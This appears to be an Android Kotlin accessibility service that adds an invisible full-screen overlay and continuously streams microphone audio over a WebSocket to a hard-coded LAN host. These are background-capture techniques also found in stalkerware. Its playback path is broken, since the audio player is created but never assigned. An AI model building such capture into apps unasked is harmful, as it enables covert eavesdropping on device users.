package com.example.mediacaptureservice

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.graphics.PixelFormat
import android.media.AudioAttributes
import android.media.AudioDeviceInfo
import android.media.AudioFormat
import android.media.AudioManager
import android.media.AudioRecord
import android.media.AudioTrack
import android.media.MediaRecorder
import android.os.Build
import android.util.Log
import android.view.Gravity
import android.view.WindowManager
import android.view.accessibility.AccessibilityEvent
import android.widget.FrameLayout
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import okio.ByteString
import okio.ByteString.Companion.toByteString
import java.util.concurrent.TimeUnit

class MyService : AccessibilityService() {

    companion object {
        private const val LOG_TAG_S = "MyService:"
        private const val CHANNEL_ID = "MyAccessibilityService"
        const val RECORDER_SAMPLERATE = 44100
        const val CHANNEL_IN  = AudioFormat.CHANNEL_IN_STEREO
        const val CHANNEL_OUT = AudioFormat.CHANNEL_OUT_STEREO
        const val RECORDER_AUDIO_ENCODING    = AudioFormat.ENCODING_PCM_16BIT
    }
    private var audioRecord: AudioRecord? = null
    private val client = OkHttpClient.Builder().connectTimeout(30, TimeUnit.SECONDS).readTimeout(30, TimeUnit.SECONDS).build()
    private val scope = CoroutineScope(Dispatchers.Default)
    private var webSocket: WebSocket? = null
    private var audioTrack: AudioTrack? = null
    val BUFFER_SIZE_RECORDING = AudioRecord.getMinBufferSize(
        RECORDER_SAMPLERATE,
        CHANNEL_IN,
        RECORDER_AUDIO_ENCODING
    ) * 4
    val BUFFER_SIZE_PLAYING = AudioTrack.getMinBufferSize(RECORDER_SAMPLERATE, CHANNEL_OUT, RECORDER_AUDIO_ENCODING)
    val request = Request.Builder().url("ws://192.168.50.52:3000").build()
    private lateinit var windowManager: WindowManager


    @SuppressLint("RtlHardcoded")
    override fun onCreate() {
        super.onCreate()
        windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        Log.i("start Myservice", "MyService")
        startForegroundService()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        Log.e(LOG_TAG_S, "Event : ${event?.eventType}")
    }

    override fun onInterrupt() {
        stopPlaying()
        stopForeground(STOP_FOREGROUND_REMOVE)

    }
    override fun onDestroy() {
        super.onDestroy()
        stopPlaying()
        stopForeground(STOP_FOREGROUND_REMOVE)
    }

    @SuppressLint("RtlHardcoded")
    override fun onServiceConnected() {
        super.onServiceConnected()
        println("onServiceConnected")

        // 1) 浮層顯示
//////////////// uncomment here to show remove the layer and icon
//        val layout = FrameLayout(this).apply {
//            setBackgroundColor(0x55FF0000) // 半透明紅
//        }
//        val iv = ImageView(this).apply {
//            setImageResource(R.drawable.ic_launcher_foreground)
//        }
//        val ivParams = FrameLayout.LayoutParams(200, 200, Gravity.START or Gravity.TOP).apply {
//            leftMargin = 20
//            topMargin = 20
//        }
//        layout.addView(iv, ivParams)
/////////////////

//////////////   comment this line if want the red layer shown on the top
        val layout = FrameLayout(this)


        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_FULLSCREEN or
                    WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                    WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS or
                    WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = Gravity.TOP
        }
        windowManager.addView(layout, params)

        // 2) AccessibilityServiceInfo 設定
        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPES_ALL_MASK
            feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK
            notificationTimeout = 100
            packageNames = null
        }

        // 3) 啟動錄音
        try {
            startPlaying()
            //startRecordingA()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun startPlaying() {
        if (audioRecord != null) {
            Log.i(LOG_TAG_S, "Recording is already in progress")
            return
        }
        //checkPermission()
        initPlayer()
        initWebSocket()
        audioRecord = AudioRecord(
            MediaRecorder.AudioSource.VOICE_RECOGNITION,
            RECORDER_SAMPLERATE, CHANNEL_IN,
            RECORDER_AUDIO_ENCODING, BUFFER_SIZE_RECORDING
        )
        audioRecord?.startRecording()
        val buf = ByteArray(BUFFER_SIZE_RECORDING)
        scope.launch {
            try {
                do {
                    val byteRead = audioRecord?.read(buf,0, buf.size)?: break
                    if (byteRead < -1)
                        break
                    webSocket?.send(buf.toByteString(0, byteRead))
                } while (true)
            } catch (e: Exception) {
                Log.i("error", e.toString())
                stopPlaying()
            }
        }
    }

    private fun stopPlaying() {
        webSocket?.cancel()
        audioRecord?.stop()
        audioRecord?.release()
        audioRecord = null
        audioTrack?.stop()
        audioTrack?.release()
        audioTrack = null
    }
    private fun initPlayer(): AudioTrack {
        val minBuf = AudioTrack.getMinBufferSize(RECORDER_SAMPLERATE, CHANNEL_OUT, RECORDER_AUDIO_ENCODING)
        return AudioTrack.Builder()
            .setAudioAttributes(
                AudioAttributes.Builder()
                    .setUsage(AudioAttributes.USAGE_VOICE_COMMUNICATION)
                    .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
                    .build()
            )
            .setAudioFormat(
                AudioFormat.Builder()
                    .setSampleRate(RECORDER_SAMPLERATE)
                    .setChannelMask(CHANNEL_OUT)
                    .setEncoding(RECORDER_AUDIO_ENCODING)
                    .build()
            )
            .setBufferSizeInBytes(minBuf * 4)
            .setTransferMode(AudioTrack.MODE_STREAM)
            .build().apply { play() }
    }
    private fun startForegroundService() {
        createNotificationChannel()
        val intent = Intent(this, MainActivity::class.java)
        val pending = PendingIntent.getActivity(this, 0, intent, 0)
        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("recording Service")
            .setContentText("Start")
            .setSmallIcon(R.drawable.ic_launcher_background)
            .setContentIntent(pending)
            .build()
        startForeground(1, notification)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Recording Service Channel",
                NotificationManager.IMPORTANCE_DEFAULT
            )
            (getSystemService(NotificationManager::class.java)).createNotificationChannel(channel)
        }
    }

    private fun hasWiredHeadset(am: AudioManager): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            return am.isWiredHeadsetOn
        }
        am.getDevices(AudioManager.GET_DEVICES_INPUTS or AudioManager.GET_DEVICES_OUTPUTS)
            .forEach { device ->
                when (device.type) {
                    AudioDeviceInfo.TYPE_WIRED_HEADSET ->
                        Log.d(LOG_TAG_S, "found wired headset")
                    AudioDeviceInfo.TYPE_USB_DEVICE ->
                        Log.d(LOG_TAG_S, "found USB audio device")
                    AudioDeviceInfo.TYPE_TELEPHONY ->
                        Log.d(LOG_TAG_S, "found telephony audio")
                }
                if (device.type == AudioDeviceInfo.TYPE_WIRED_HEADSET ||
                    device.type == AudioDeviceInfo.TYPE_USB_DEVICE ||
                    device.type == AudioDeviceInfo.TYPE_TELEPHONY) {
                    return true
                }
            }
        return false
    }
    fun initWebSocket() {
        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                super.onOpen(webSocket, response)
                Log.d("message", "open")
            }

            override fun onMessage(webSocket: WebSocket, bytes: ByteString) {
                super.onMessage(webSocket, bytes)
                scope.launch(Dispatchers.IO) {
                    val pcm = bytes.toByteArray()
                    var offset = 0
                    while (offset < pcm.size) {
                        val written = audioTrack?.write(pcm, offset, pcm.size - offset)
                        if (written != null) {
                            if (written <= 0) {
                                Log.e("MyService", "AudioTrack.write returned $written")
                                break
                            }
                            offset += written
                        }
                    }
                }
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                super.onFailure(webSocket, t, response)
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                super.onClosed(webSocket, code, reason)
                Log.d("message", "closed")
            }
        })
    }
}
